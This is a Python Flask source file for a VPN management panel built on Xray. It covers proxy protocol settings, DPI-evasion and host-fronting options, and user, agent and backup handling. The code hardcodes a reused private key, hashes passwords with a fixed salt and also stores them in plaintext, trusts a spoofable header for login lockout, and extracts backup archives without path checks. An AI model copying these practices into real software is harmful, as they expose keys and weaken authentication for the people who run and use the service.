#!/usr/bin/env python3
"""VPN Management Panel - Enhanced Version"""
import io
import zipfile
import logging
import functools

from flask import Flask, render_template, jsonify, request, send_file, session, make_response, has_request_context
import sqlite3
import json
import re
import subprocess
import uuid as uuid_lib
import base64
import hashlib
import os
import time
import secrets
import glob as globmod
import shutil
import urllib.parse
from datetime import datetime, timedelta
from functools import wraps
from collections import defaultdict
import ipaddress
import threading
import random
import string
import scripts.speed_manager as speed_manager
from protocols import get_protocol_engine

_DPI_EVASION_IMPORT_ERROR = ""
try:
    import scripts.dpi_evasion as dpi_evasion
    DPI_EVASION_AVAILABLE = True
except Exception as exc:
    dpi_evasion = None
    DPI_EVASION_AVAILABLE = False
    _DPI_EVASION_IMPORT_ERROR = str(exc)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('vpn-panel.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('VPNPanel')
if _DPI_EVASION_IMPORT_ERROR:
    logger.warning(f"DPI evasion module unavailable: {_DPI_EVASION_IMPORT_ERROR}")

# ── Core Constants ─────────────────────────────────────
DB = "vpn_users.db"
XRAY_CONFIG = "/usr/local/etc/xray/config.json"
XRAY_BIN = "/usr/local/bin/xray"
V2RAY_BIN = "/usr/local/bin/xray"
SERVER_IP = os.environ.get("VPN_SERVER_IP", "127.0.0.1")
SERVER_PORT = os.environ.get("VPN_SERVER_PORT", "443")
SNI_HOST = os.environ.get("VPN_SNI_HOST", "chat.deepseek.com")
WS_PATH = "/api/v1/stream"
API_PORT = int(os.environ.get("VPN_API_PORT", "10085"))
WEB_PORT = int(os.environ.get("VPN_WEB_PORT", "38471"))

# ── Settings / Security ───────────────────────────────
SETTINGS_FILE = "vpn-settings.json"
PW_FILE = "vpn-panel-password"
HASH_FILE = "vpn-panel-password-hash"
BACKUP_DIR = "backups"
BACKUP_SCRIPT = "vpn-backup.sh"
ACCESS_LOG = "access.log"
KILL_LOG = "kill-switch.log"

MAX_LOGIN_ATTEMPTS = 3
LOCKOUT_SECONDS = 1800
SESSION_LIFETIME_HOURS = 1

DEFAULT_SETTINGS = {
    "reality_private_key": "aGM7HELLUCgA3icWeQYOba7HL-82ocrTkG3k4PhBZ28",
    "reality_public_key": "oZVaAa694VcKxWb-gH31sPpMIQ9XAozoJ6BOAA1DkC0",
    "reality_short_id": "",
    "reality_dest": "digikala.com:443",
    "reality_sni": "digikala.com",
    "vless_port": 2053,
    "cdn_enabled": False,
    "cdn_domain": "",
    "cdn_port": 2082,
    "cdn_ws_path": "/cdn-ws",
    "outbound_mode": "direct",
    "kill_switch_enabled": False,
    "backup_retention_days": 7,
    # Config customization
    "config_prefix": "Proxy",
    "vmess_port": 443,
    "vmess_sni": "www.aparat.com",
    "vmess_ws_path": "/api/v1/stream",
    # Trojan
    "trojan_enabled": False,
    "trojan_port": 2083,
    # gRPC
    "grpc_enabled": False,
    "grpc_port": 2054,
    "grpc_service_name": "GunService",
    # HTTPUpgrade
    "httpupgrade_enabled": False,
    "httpupgrade_port": 2055,
    "httpupgrade_path": "/httpupgrade",
    # ShadowSocks 2022
    "ss2022_enabled": False,
    "ss2022_port": 2056,
    "ss2022_method": "2022-blake3-aes-128-gcm",
    "ss2022_server_key": "",
    # VLESS + WS + TLS (separate from Reality — CDN compatible)
    "vless_ws_enabled": False,
    "vless_ws_port": 2057,
    "vless_ws_path": "/vless-ws",
    # ── VLESS+XHTTP+REALITY (relay-fronted) ──
    "vless_xhttp_enabled": True,
    "vless_xhttp_port": 2053,
    "vless_xhttp_reality_private_key": "aGM7HELLUCgA3icWeQYOba7HL-82ocrTkG3k4PhBZ28",
    "vless_xhttp_reality_public_key": "oZVaAa694VcKxWb-gH31sPpMIQ9XAozoJ6BOAA1DkC0",
    "vless_xhttp_reality_short_id": "",
    "vless_xhttp_reality_dest": "digikala.com:443",
    "vless_xhttp_reality_sni": "digikala.com",
    "vless_xhttp_path": "/xhttp-stream",
    "vless_xhttp_mode": "auto",
    # ── VLESS+REALITY+Vision (direct, fresh IP) ──
    "vless_vision_enabled": True,
    "vless_vision_port": 2058,
    "vless_vision_reality_private_key": "aGM7HELLUCgA3icWeQYOba7HL-82ocrTkG3k4PhBZ28",
    "vless_vision_reality_public_key": "oZVaAa694VcKxWb-gH31sPpMIQ9XAozoJ6BOAA1DkC0",
    "vless_vision_reality_short_id": "",
    "vless_vision_reality_dest": "objects.githubusercontent.com:443",
    "vless_vision_reality_sni": "objects.githubusercontent.com",
    "vless_vision_flow": "xtls-rprx-vision",
    # ── Reverse-tunneled VLESS-Reality (Backhaul/Rathole) ──
    "vless_reverse_enabled": False,
    "vless_reverse_port": 2059,
    "vless_reverse_reality_private_key": "aGM7HELLUCgA3icWeQYOba7HL-82ocrTkG3k4PhBZ28",
    "vless_reverse_reality_public_key": "oZVaAa694VcKxWb-gH31sPpMIQ9XAozoJ6BOAA1DkC0",
    "vless_reverse_reality_short_id": "",
    "vless_reverse_reality_dest": "digikala.com:443",
    "vless_reverse_reality_sni": "digikala.com",
    "vless_reverse_tunnel_port": 0,
    "vless_reverse_backhaul_mode": "rathole",
    # ── Trojan+WS/gRPC+TLS over Cloudflare CDN ──
    "trojan_cdn_enabled": False,
    "trojan_cdn_port": 2083,
    "trojan_cdn_ws_path": "/trojan-ws",
    "trojan_cdn_grpc_service": "TrojanService",
    "trojan_cdn_grpc_enabled": False,
    "trojan_cdn_grpc_port": 2060,
    "trojan_cdn_tls_enabled": True,
    "trojan_cdn_sni": "",
    "trojan_cdn_domain": "",
    # ── Hysteria2+Salamander+port-hop ──
    "hysteria2_enabled": False,
    "hysteria2_port": 8443,
    "hysteria2_password": "",
    "hysteria2_salamander_enabled": False,
    "hysteria2_salamander_password": "",
    "hysteria2_port_hop_enabled": False,
    "hysteria2_port_hop_ports": "20000-50000",
    "hysteria2_bandwidth_up": "100 mbps",
    "hysteria2_bandwidth_down": "200 mbps",
    # ── TUIC v5 ──
    "tuic_enabled": False,
    "tuic_port": 8444,
    "tuic_password": "",
    "tuic_congestion_control": "cubic",
    "tuic_udp_relay": "native",
    "tuic_zero_rtt": False,
    # ── AmneziaWG 2.0 ──
    "amneziawg_enabled": False,
    "amneziawg_port": 51820,
    "amneziawg_private_key": "",
    "amneziawg_address": "10.8.0.1/24",
    "amneziawg_dns": "1.1.1.1",
    "amneziawg_jc": 4,
    "amneziawg_jmin": 50,
    "amneziawg_jmax": 1000,
    "amneziawg_s1": 0,
    "amneziawg_s2": 0,
    "amneziawg_h1": 1,
    "amneziawg_h2": 2,
    "amneziawg_h3": 3,
    "amneziawg_h4": 4,
    "amneziawg_mtu": 1280,
    # ── ShadowTLS v3 ──
    "shadowtls_enabled": False,
    "shadowtls_port": 8445,
    "shadowtls_password": "",
    "shadowtls_sni": "rubika.ir",
    "shadowtls_version": 3,
    "shadowtls_backend": "127.0.0.1:1080",
    # ── Mieru ──
    "mieru_enabled": False,
    "mieru_port": 8446,
    "mieru_password": "",
    "mieru_encryption": "aes-256-gcm",
    "mieru_transport": "tcp",
    "mieru_mux_enabled": True,
    "mieru_mux_concurrency": 8,
    # ── NaiveProxy (official) ──
    "naiveproxy_enabled": False,
    "naiveproxy_port": 8447,
    "naiveproxy_user": "",
    "naiveproxy_password": "",
    "naiveproxy_sni": "",
    "naiveproxy_concurrency": 4,
    # ── Plain WireGuard ──
    "wireguard_enabled": False,
    "wireguard_port": 51821,
    "wireguard_private_key": "",
    "wireguard_address": "10.9.0.1/24",
    "wireguard_dns": "1.1.1.1",
    "wireguard_mtu": 1280,
    "wireguard_persistent_keepalive": 25,
    # ── Plain OpenVPN ──
    "openvpn_enabled": False,
    "openvpn_port": 1194,
    "openvpn_proto": "udp",
    "openvpn_network": "10.10.0.0/24",
    "openvpn_dns": "1.1.1.1",
    # Fragment (client-side anti-DPI)
    "fragment_enabled": False,
    "fragment_packets": "tlshello",
    "fragment_length": "100-200",
    "fragment_interval": "10-20",
    # MUX
    "mux_enabled": False,
    "mux_concurrency": 8,
    # uTLS Fingerprint
    "fingerprint": "chrome",
    # Noise / padding
    "noise_enabled": False,
    "noise_packet": "rand:50-100",
    "noise_delay": "10-20",
    # DPI Evasion (Real - Server-side)
    "dpi_tcp_fragment": False,
    "dpi_tls_fragment": False,
    "dpi_ip_fragment": False,
    "dpi_tcp_keepalive": False,
    "dpi_dns_tunnel": False,
    "dpi_icmp_tunnel": False,
    "dpi_domain_front": False,
    "dpi_cdn_front_enabled": False,
    "dpi_cdn_front": "",
    # ── Advanced DPI Evasion Techniques ──
    # HTTP Host Header Spoofing: Sends fake Host header to bypass DPI
    # that inspects HTTP headers. Works with VMess/VLESS+WS+TLS.
    "dpi_http_host_spoof_enabled": False,
    "dpi_http_host_spoof_domain": "chat.deepseek.com",
    # WebSocket Host Fronting: Uses different Host header than SNI
    # to bypass DPI that compares SNI with HTTP Host header.
    "dpi_ws_host_front_enabled": False,
    "dpi_ws_host_front_domain": "rubika.ir",
    # CDN Host Header Fronting: Routes traffic through CDN with
    # fake Host header to hide real destination from DPI.
    "dpi_cdn_host_front_enabled": False,
    "dpi_cdn_host_front_domain": "web.splus.ir",
    # Bug Host / Host Header Injection: Injects fake Host headers
    # into TLS ClientHello to confuse DPI pattern matching.
    "dpi_bug_host_enabled": False,
    "dpi_bug_host_domain": "chat.deepseek.com",
}

DPI_SETTING_KEYS = {
    "dpi_tcp_fragment",
    "dpi_tls_fragment",
    "dpi_ip_fragment",
    "dpi_tcp_keepalive",
    "dpi_dns_tunnel",
    "dpi_icmp_tunnel",
    "dpi_domain_front",
    "dpi_cdn_front_enabled",
    "dpi_cdn_front",
}

PROTOCOL_ENABLE_KEYS = {
    "cdn_enabled",
    "trojan_enabled",
    "grpc_enabled",
    "httpupgrade_enabled",
    "ss2022_enabled",
    "vless_ws_enabled",
    "vless_xhttp_enabled",
    "vless_vision_enabled",
    "vless_reverse_enabled",
    "trojan_cdn_enabled",
    "trojan_cdn_grpc_enabled",
    "hysteria2_enabled",
    "tuic_enabled",
    "amneziawg_enabled",
    "shadowtls_enabled",
    "mieru_enabled",
    "naiveproxy_enabled",
    "wireguard_enabled",
    "openvpn_enabled",
}

BOOLEAN_SETTING_KEYS = {
    "kill_switch_enabled",
    "cdn_enabled",
    "trojan_enabled",
    "grpc_enabled",
    "httpupgrade_enabled",
    "fragment_enabled",
    "mux_enabled",
    "ss2022_enabled",
    "vless_ws_enabled",
    "telegram_enabled",
    "telegram_notify_user_disabled",
    "telegram_notify_user_expired",
    "telegram_notify_kill_switch",
    "telegram_notify_traffic_exhausted",
    "telegram_notify_user_created",
    "telegram_notify_user_deleted",
    "dpi_tcp_fragment",
    "dpi_tls_fragment",
    "dpi_ip_fragment",
    "dpi_tcp_keepalive",
    "dpi_dns_tunnel",
    "dpi_icmp_tunnel",
    "dpi_domain_front",
    "dpi_cdn_front_enabled",
    "dpi_http_host_spoof_enabled",
    "dpi_ws_host_front_enabled",
    "dpi_cdn_host_front_enabled",
    "dpi_bug_host_enabled",
    "noise_enabled",
    *PROTOCOL_ENABLE_KEYS,
}


def _as_bool(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().lower() in {"1", "true", "yes", "on"}
    return False


def _normalize_settings_types(data):
    normalized = dict(data)
    for key in BOOLEAN_SETTING_KEYS:
        if key in normalized:
            normalized[key] = _as_bool(normalized[key])
    return normalized


def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE) as f:
                saved = json.load(f)
            return _normalize_settings_types({**DEFAULT_SETTINGS, **saved})
        except Exception:
            pass
    return _normalize_settings_types(DEFAULT_SETTINGS)


def save_settings(s):
    s = _normalize_settings_types(s)
    with open(SETTINGS_FILE, "w") as f:
        json.dump(s, f, indent=2)
    os.chmod(SETTINGS_FILE, 0o600)


settings = load_settings()


def _is_placeholder_host(host):
    host = (host or "").strip().lower()
    if not host:
        return True
    if host.startswith("[") and "]" in host:
        host = host[1:host.index("]")]
    elif ":" in host:
        host = host.rsplit(":", 1)[0]
    return host in {"0.0.0.0", "127.0.0.1", "localhost", "::1", "your-server-ip"}


def _strip_host_port(host):
    host = (host or "").strip()
    if host.startswith("[") and "]" in host:
        return host[1:host.index("]")]
    if ":" in host:
        maybe_host, maybe_port = host.rsplit(":", 1)
        if maybe_port.isdigit():
            return maybe_host
    return host


def _request_config_host():
    if not has_request_context():
        return SERVER_IP
    for header in ("X-Forwarded-Host", "Host"):
        raw = (request.headers.get(header) or "").split(",", 1)[0].strip()
        host = _strip_host_port(raw)
        if not _is_placeholder_host(host):
            return host
    return SERVER_IP


def _config_host(server_ip=None):
    candidate = server_ip or SERVER_IP
    if _is_placeholder_host(candidate):
        return _request_config_host()
    return candidate

# ── Enhanced Features ──────────────────────────────────

def generate_user_report():
    """Generate comprehensive user statistics report"""
    conn = get_db()
    c = conn.cursor()
    
    # Total users
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    # Active users
    c.execute("SELECT COUNT(*) FROM users WHERE active=1")
    active_users = c.fetchone()[0]
    
    # Inactive users
    c.execute("SELECT COUNT(*) FROM users WHERE active=0")
    inactive_users = c.fetchone()[0]
    
    # Total traffic used
    c.execute("SELECT COALESCE(SUM(traffic_used_gb), 0) FROM users")
    total_traffic = c.fetchone()[0]
    
    # Total traffic limit
    c.execute("SELECT COALESCE(SUM(traffic_limit_gb), 0) FROM users")
    total_limit = c.fetchone()[0]
    
    # Users expiring soon (within 7 days)
    now = datetime.now()
    week_later = (now + timedelta(days=7)).isoformat()
    c.execute("SELECT COUNT(*) FROM users WHERE expire_at < ? AND expire_at > ? AND active=1", 
              (week_later, now.isoformat()))
    expiring_soon = c.fetchone()[0]
    
    # Top users by traffic
    c.execute("""
        SELECT name, traffic_used_gb, traffic_limit_gb, active 
        FROM users 
        ORDER BY traffic_used_gb DESC 
        LIMIT 10
    """)
    top_users = c.fetchall()
    
    conn.close()
    
    return {
        "total_users": total_users,
        "active_users": active_users,
        "inactive_users": inactive_users,
        "total_traffic_gb": round(total_traffic, 2),
        "total_limit_gb": round(total_limit, 2),
        "expiring_soon": expiring_soon,
        "top_users": [dict(user) for user in top_users]
    }

def get_user_activity_history(username, limit=50):
    """Get recent activity history for a user"""
    conn = get_db()
    c = conn.cursor()
    
    # Get user's recent connections from access log
    try:
        with open(ACCESS_LOG, 'r') as f:
            lines = f.readlines()[-limit:]
        
        activities = []
        for line in lines:
            if username in line:
                # Parse log line
                parts = line.split()
                if len(parts) >= 3:
                    activities.append({
                        'timestamp': parts[0],
                        'action': 'connection',
                        'details': ' '.join(parts[1:])
                    })
    except Exception:
        activities = []
    
    conn.close()
    return activities

def export_users_data(format='csv'):
    """Export users data in specified format"""
    conn = get_db()
    c = conn.cursor()
    
    c.execute("""
        SELECT name, uuid, traffic_limit_gb, traffic_used_gb, 
               expire_at, active, created_at, note
        FROM users
        ORDER BY created_at DESC
    """)
    users = c.fetchall()
    conn.close()
    
    if format == 'csv':
        import csv
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['Name', 'UUID', 'Traffic Limit (GB)', 'Traffic Used (GB)', 
                        'Expire At', 'Active', 'Created At', 'Note'])
        for user in users:
            writer.writerow([user['name'], user['uuid'], user['traffic_limit_gb'], 
                           user['traffic_used_gb'], user['expire_at'], user['active'], 
                           user['created_at'], user['note']])
        return output.getvalue(), 'text/csv'
    
    elif format == 'json':
        data = [dict(user) for user in users]
        return json.dumps(data, indent=2), 'application/json'
    
    return None, None

def get_system_health():
    """Get system health metrics"""
    try:
        # CPU usage
        import psutil
        cpu_percent = psutil.cpu_percent(interval=1)
        
        # Memory usage
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        
        # Disk usage
        disk = psutil.disk_usage('/')
        disk_percent = disk.percent
        
        # Network connections
        connections = len(psutil.net_connections())
        
        return {
            'cpu_percent': cpu_percent,
            'memory_percent': memory_percent,
            'disk_percent': disk_percent,
            'connections': connections,
            'status': 'healthy' if cpu_percent < 80 and memory_percent < 80 else 'warning'
        }
    except Exception as e:
        logger.error(f"Health check failed: {e}")
        return {
            'cpu_percent': 0,
            'memory_percent': 0,
            'disk_percent': 0,
            'connections': 0,
            'status': 'error'
        }

def get_traffic_analytics(days=7):
    """Get traffic analytics for the specified period"""
    conn = get_db()
    c = conn.cursor()
    
    start_date = (datetime.now() - timedelta(days=days)).isoformat()
    
    # Daily traffic usage
    c.execute("""
        SELECT DATE(created_at) as date, 
               SUM(traffic_used_gb) as total_traffic,
               COUNT(*) as user_count
        FROM users 
        WHERE created_at >= ?
        GROUP BY DATE(created_at)
        ORDER BY date DESC
    """, (start_date,))
    
    daily_data = c.fetchall()
    
    # Top protocols by usage
    c.execute("""
        SELECT name, traffic_used_gb
        FROM users
        WHERE active = 1
        ORDER BY traffic_used_gb DESC
        LIMIT 10
    """)
    
    top_users = c.fetchall()
    
    conn.close()
    
    return {
        'daily_traffic': [dict(row) for row in daily_data],
        'top_users': [dict(row) for row in top_users],
        'period_days': days
    }

def search_users(query):
    """Search users by name, UUID, or note"""
    conn = get_db()
    c = conn.cursor()
    
    search_pattern = f"%{query}%"
    c.execute("""
        SELECT * FROM users 
        WHERE name LIKE ? OR uuid LIKE ? OR note LIKE ?
        ORDER BY created_at DESC
    """, (search_pattern, search_pattern, search_pattern))
    
    users = c.fetchall()
    conn.close()
    
    return [dict(user) for user in users]

def bulk_update_users(user_ids, updates):
    """Bulk update multiple users"""
    conn = get_db()
    c = conn.cursor()
    
    updated = 0
    for user_id in user_ids:
        set_clauses = []
        values = []
        
        if 'active' in updates:
            set_clauses.append("active = ?")
            values.append(updates['active'])
        
        if 'traffic_limit_gb' in updates:
            set_clauses.append("traffic_limit_gb = ?")
            values.append(updates['traffic_limit_gb'])
        
        if 'expire_at' in updates:
            set_clauses.append("expire_at = ?")
            values.append(updates['expire_at'])
        
        if set_clauses:
            values.append(user_id)
            c.execute(f"UPDATE users SET {', '.join(set_clauses)} WHERE id = ?", values)
            updated += c.rowcount
    
    conn.commit()
    conn.close()
    
    return updated

def get_user_statistics(user_id):
    """Get detailed statistics for a specific user"""
    conn = get_db()
    c = conn.cursor()
    
    c.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if not user:
        conn.close()
        return None
    
    user_dict = dict(user)
    
    # Calculate remaining traffic
    remaining = max(0, user_dict['traffic_limit_gb'] - user_dict['traffic_used_gb'])
    user_dict['remaining_traffic_gb'] = round(remaining, 2)
    
    # Calculate days until expiration
    if user_dict['expire_at']:
        expire_date = datetime.fromisoformat(user_dict['expire_at'])
        days_left = (expire_date - datetime.now()).days
        user_dict['days_until_expiry'] = days_left
    
    # Get activity history
    user_dict['activity_history'] = get_user_activity_history(user_dict['name'])
    
    conn.close()
    return user_dict

def create_backup():
    """Create backup of database and settings"""
    try:
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"vpn_backup_{timestamp}"
        
        # Backup database
        db_backup = os.path.join(backup_dir, f"{backup_name}.db")
        shutil.copy2(DB, db_backup)
        
        # Backup settings
        settings_backup = os.path.join(backup_dir, f"{backup_name}_settings.json")
        if os.path.exists(SETTINGS_FILE):
            shutil.copy2(SETTINGS_FILE, settings_backup)
        
        # Create compressed archive
        archive_path = os.path.join(backup_dir, f"{backup_name}.zip")
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(db_backup, os.path.basename(db_backup))
            if os.path.exists(settings_backup):
                zipf.write(settings_backup, os.path.basename(settings_backup))
        
        # Remove individual files
        os.remove(db_backup)
        if os.path.exists(settings_backup):
            os.remove(settings_backup)
        
        logger.info(f"Backup created: {archive_path}")
        return archive_path
    except Exception as e:
        logger.error(f"Backup failed: {e}")
        return None

def restore_backup(backup_path):
    """Restore from backup file"""
    try:
        if not os.path.exists(backup_path):
            return False, "Backup file not found"
        
        # Extract backup
        extract_dir = "/tmp/vpn_restore"
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(backup_path, 'r') as zipf:
            zipf.extractall(extract_dir)
        
        # Find and restore database
        for file in os.listdir(extract_dir):
            if file.endswith('.db'):
                shutil.copy2(os.path.join(extract_dir, file), DB)
            elif file.endswith('_settings.json'):
                shutil.copy2(os.path.join(extract_dir, file), SETTINGS_FILE)
        
        # Clean up
        shutil.rmtree(extract_dir, ignore_errors=True)
        
        logger.info(f"Restored from backup: {backup_path}")
        return True, "Backup restored successfully"
    except Exception as e:
        logger.error(f"Restore failed: {e}")
        return False, str(e)

def cleanup_old_backups(retention_days=7):
    """Remove backups older than retention period"""
    try:
        backup_dir = "backups"
        if not os.path.exists(backup_dir):
            return 0
        
        now = time.time()
        removed = 0
        
        for file in os.listdir(backup_dir):
            if file.startswith('vpn_backup_') and file.endswith('.zip'):
                file_path = os.path.join(backup_dir, file)
                file_time = os.path.getmtime(file_path)
                if now - file_time > retention_days * 86400:
                    os.remove(file_path)
                    removed += 1
        
        logger.info(f"Cleaned up {removed} old backups")
        return removed
    except Exception as e:
        logger.error(f"Cleanup failed: {e}")
        return 0


# ── Password ───────────────────────────────────────────

def _hash_pw(pw):
    salt = "3c7aa6239d241926e2ff6e7a022acecdb16f8e94542b4419"
    return hashlib.sha256(f"{salt}:{pw}".encode()).hexdigest()


def get_panel_password_hash():
    if os.path.exists(HASH_FILE):
        with open(HASH_FILE) as f:
            return f.read().strip()
    if os.path.exists(PW_FILE):
        with open(PW_FILE) as f:
            pw = f.read().strip()
    else:
        pw = secrets.token_urlsafe(12)
        with open(PW_FILE, "w") as f:
            f.write(pw)
        os.chmod(PW_FILE, 0o600)
    pw_hash = _hash_pw(pw)
    with open(HASH_FILE, "w") as f:
        f.write(pw_hash)
    os.chmod(HASH_FILE, 0o600)
    return pw_hash


def set_panel_password(new_pw):
    pw_hash = _hash_pw(new_pw)
    with open(HASH_FILE, "w") as f:
        f.write(pw_hash)
    os.chmod(HASH_FILE, 0o600)
    with open(PW_FILE, "w") as f:
        f.write(new_pw)
    os.chmod(PW_FILE, 0o600)
    return pw_hash


# ── Flask App ──────────────────────────────────────────

app = Flask(__name__, static_folder='static', static_url_path='/static')
app.secret_key = secrets.token_bytes(32)
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["SESSION_COOKIE_NAME"] = "sid"
app.config["SESSION_COOKIE_SECURE"] = False
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=SESSION_LIFETIME_HOURS)

PANEL_PASSWORD_HASH = get_panel_password_hash()
_login_attempts = defaultdict(list)


def get_db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute(
        """CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY, name TEXT UNIQUE, uuid TEXT UNIQUE,
        traffic_limit_gb REAL, traffic_used_gb REAL DEFAULT 0,
        expire_at TEXT, active INTEGER DEFAULT 1, created_at TEXT)"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS kill_switch_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT, ts TEXT, username TEXT,
        host TEXT, reason TEXT)"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS agents (
        id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL, traffic_quota_gb REAL NOT NULL,
        active INTEGER DEFAULT 1, created_at TEXT)"""
    )
    # Add agent_id column to users if missing (safe for existing DBs)
    try:
        c.execute("ALTER TABLE users ADD COLUMN agent_id INTEGER")
    except Exception:
        pass
    # Add brand_name column to agents if missing
    try:
        c.execute("ALTER TABLE agents ADD COLUMN brand_name TEXT DEFAULT ''")
    except Exception:
        pass
    # Add max_connections column to users if missing (legacy, no longer enforced)
    try:
        c.execute("ALTER TABLE users ADD COLUMN max_connections INTEGER DEFAULT 1")
    except Exception:
        pass
    # Add speed limit columns to users (KB/s, default 200)
    try:
        c.execute("ALTER TABLE users ADD COLUMN speed_limit_up INTEGER DEFAULT 200")
    except Exception:
        pass
    try:
        c.execute("ALTER TABLE users ADD COLUMN speed_limit_down INTEGER DEFAULT 200")
    except Exception:
        pass
    # Add default speed limit to agents
    try:
        c.execute("ALTER TABLE agents ADD COLUMN speed_limit_default INTEGER DEFAULT 200")
    except Exception:
        pass
    try:
        c.execute("ALTER TABLE users ADD COLUMN note TEXT DEFAULT ''")
    except Exception:
        pass
    conn.commit()
    conn.close()


init_db()


# ── Auth Helpers ───────────────────────────────────────

def _get_client_ip():
    return (
        request.headers.get("X-Forwarded-For", request.remote_addr or "0.0.0.0")
        .split(",")[0]
        .strip()
    )


def _is_locked_out(ip):
    now = time.time()
    _login_attempts[ip] = [t for t in _login_attempts[ip] if now - t < LOCKOUT_SECONDS]
    return len(_login_attempts[ip]) >= MAX_LOGIN_ATTEMPTS


def _record_failed_attempt(ip):
    _login_attempts[ip].append(time.time())


def _clear_attempts(ip):
    _login_attempts.pop(ip, None)


def _remaining_attempts(ip):
    now = time.time()
    recent = [t for t in _login_attempts.get(ip, []) if now - t < LOCKOUT_SECONDS]
    return max(0, MAX_LOGIN_ATTEMPTS - len(recent))


@app.after_request
def add_security_headers(response):
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-XSS-Protection"] = "0"
    response.headers["Referrer-Policy"] = "no-referrer"
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Content-Security-Policy"] = "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; font-src 'self' https://fonts.gstatic.com"
    response.headers["Permissions-Policy"] = "geolocation=(), camera=(), microphone=()"
    response.headers["X-Permitted-Cross-Domain-Policies"] = "none"
    response.headers.pop("Server", None)
    return response


def require_auth(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if not session.get("auth"):
            return jsonify({"error": "unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapped


# ── Agent Auth Helpers ─────────────────────────────────

_agent_login_attempts = defaultdict(list)


def require_agent_auth(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if not session.get("agent_auth") or not session.get("agent_id"):
            return jsonify({"error": "unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapped


def get_agent_used_quota(agent_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COALESCE(SUM(traffic_limit_gb), 0) FROM users WHERE agent_id=?", (agent_id,))
    used = c.fetchone()[0]
    conn.close()
    return float(used)


def check_agent_quota(agent_id, needed_gb):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT traffic_quota_gb, active FROM agents WHERE id=?", (agent_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        return False, "Agent not found"
    if not row["active"]:
        return False, "Agent is disabled"
    used = get_agent_used_quota(agent_id)
    if used + needed_gb > row["traffic_quota_gb"]:
        remaining = max(0, row["traffic_quota_gb"] - used)
        return False, f"Quota exceeded. Remaining: {remaining:.1f} GB"
    return True, ""


def _agent_is_locked_out(ip):
    now = time.time()
    _agent_login_attempts[ip] = [t for t in _agent_login_attempts[ip] if now - t < LOCKOUT_SECONDS]
    return len(_agent_login_attempts[ip]) >= MAX_LOGIN_ATTEMPTS


# ── Stats API (supports Xray + V2Ray) ─────────────────

def _get_bin():
    if os.path.exists(XRAY_BIN):
        return XRAY_BIN
    return V2RAY_BIN


def query_v2ray_stats(reset=False):
    try:
        binary = _get_bin()
        is_xray = "xray" in binary

        if is_xray:
            cmd = [binary, "api", "statsquery", "-s", f"127.0.0.1:{API_PORT}",
                   "-pattern", "user"]
            if reset:
                cmd.append("-reset")
        else:
            cmd = [binary, "api", "stats", "-s", f"127.0.0.1:{API_PORT}", "-json", "user"]
            if reset:
                cmd.insert(-1, "-reset")

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            return {}
        output = result.stdout.strip()
        if not output:
            return {}
        data = json.loads(output)
        stats = {}
        for entry in data.get("stat", []):
            name = entry.get("name", "")
            try:
                value = int(entry.get("value", 0))
            except (ValueError, TypeError):
                continue
            parts = name.split(">>>")
            if len(parts) == 4 and parts[0] == "user" and parts[2] == "traffic":
                username = parts[1].replace("@vpn", "")
                if username not in stats:
                    stats[username] = {"up": 0, "down": 0}
                if parts[3] == "uplink":
                    stats[username]["up"] = value
                else:
                    stats[username]["down"] = value
        return stats
    except Exception:
        return {}


def sync_traffic_to_db():
    stats = query_v2ray_stats(reset=True)
    if not stats:
        return
    conn = get_db()
    c = conn.cursor()
    for username, data in stats.items():
        total_bytes = data["up"] + data["down"]
        if total_bytes > 0:
            gb = total_bytes / (1024**3)
            c.execute(
                "UPDATE users SET traffic_used_gb = traffic_used_gb + ? WHERE name = ?",
                (gb, username),
            )
    conn.commit()
    conn.close()


def check_and_disable():
    conn = get_db()
    c = conn.cursor()
    now = datetime.now().isoformat()
    c.execute("UPDATE users SET active=0 WHERE expire_at < ? AND active=1", (now,))
    t = c.rowcount
    c.execute(
        "UPDATE users SET active=0 WHERE traffic_used_gb >= traffic_limit_gb AND active=1"
    )
    tr = c.rowcount
    conn.commit()
    conn.close()
    return t + tr


def get_active_users_list():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name, uuid FROM users WHERE active=1")
    users = [(r["name"], r["uuid"]) for r in c.fetchall()]
    conn.close()
